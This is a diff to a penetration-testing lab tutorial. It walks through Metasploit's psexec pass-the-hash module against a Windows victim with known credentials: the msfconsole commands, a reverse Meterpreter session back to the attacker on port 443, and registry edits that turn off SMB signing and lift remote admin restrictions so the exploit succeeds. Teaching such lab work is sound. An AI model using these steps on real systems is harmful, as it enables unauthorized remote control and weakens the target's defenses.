@@ -50,9 +50,36 @@ The next section continues the lab setup towards getting an active [Metasploit M
 
 Since we already know the credentials for the victim machine, we will be using Metasploit's [psexec (pass the hash) module](https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/). In Kali, open the Metasploit framework console by typing `msfconsole` in the terminal. 
 
+<p>
+  <center>
+    <a href="../images/payload-deployment/msfconsole-zoom.png" data-lightbox="kali-network" data-title="msfconsole">
+      <img src="../images/payload-deployment/msfconsole.png" alt="Open msfconsole" />
+      <figcaption>Open msfconsole (click to zoom)</figcaption>
+    </a>
+  </center>
+</p>
+
 Within the Metasploit framework console, load the psexec exploit module by typing `use exploit/windows/smb/psexec`.
 
+<p>
+  <center>
+    <a href="../images/payload-deployment/load-exploit-zoom.png" data-lightbox="kali-network" data-title="load-exploit">
+      <img src="../images/payload-deployment/load-exploit.png" alt="Load Exploit" />
+      <figcaption>Load exploit (click to zoom)</figcaption>
+    </a>
+  </center>
+</p>
+
 Type `show options` to view the exploit configuration parameters.
+
+<p>
+  <center>
+    <a href="../images/payload-deployment/exploit-options-zoom.png" data-lightbox="kali-network" data-title="exploit-options">
+      <img src="../images/payload-deployment/exploit-options.png" alt="Exploit Options" />
+      <figcaption>Exploit Options (click to zoom)</figcaption>
+    </a>
+  </center>
+</p>
 
 Set the remote host to be the IP address of the victim machine by typing `set RHOST 192.168.115.129`.
 
@@ -66,7 +93,24 @@ Set the outbound Meterpreter connection address to be the local host (the IP add
 
 Set the outbound Meterpreter connection port to be port 443 (https) by typing `set LPORT 443`.
 
+<p>
+  <center>
+    <a href="../images/payload-deployment/exploit-parameters-zoom.png" data-lightbox="kali-network" data-title="exploit-parameters">
+      <img src="../images/payload-deployment/exploit-parameters.png" alt="Set Exploit Parameters" />
+      <figcaption>Set Exploit Parameters (click to zoom)</figcaption>
+    </a>
+  </center>
+</p>
+
 Finally run the exploit by typing `exploit`.
+
+If the exploit failed with error code `STATUS_ACCESS_DENIED (Command=117 WordCount=0)` you may need to edit a registry setting on the Window's victim. Using Window's *regedit* tool navigate to the registry key, **"HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters"** on the target systems and setting the value of **"RequireSecuritySignature"** to **"0"**. Note that while some registry keys may be case sensitive, these keys do not appear to be case sensitive. This registry edit disables the group policy requirement that communications must be digitally signed. 
+
+You may also need to add a new registry key under **"HKEY\_LOCAL\_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"**. Setting  the key to be a DWORD (32-bit) named **"LocalAccountTokenFilterPolicy"** with a value of **"1"**. This edit allows local users to perform administrative actions.
+
+After setting the registry keys, rerun the exploit in Kali. If you are still not successful, try restarting the Windows machine and double checking your exploit configuration parameters by typing `set` to view the current values.
+
+If the exploit was successful you will see that one new session was created. 
 
 <a name="PostExploitation"></a>
 
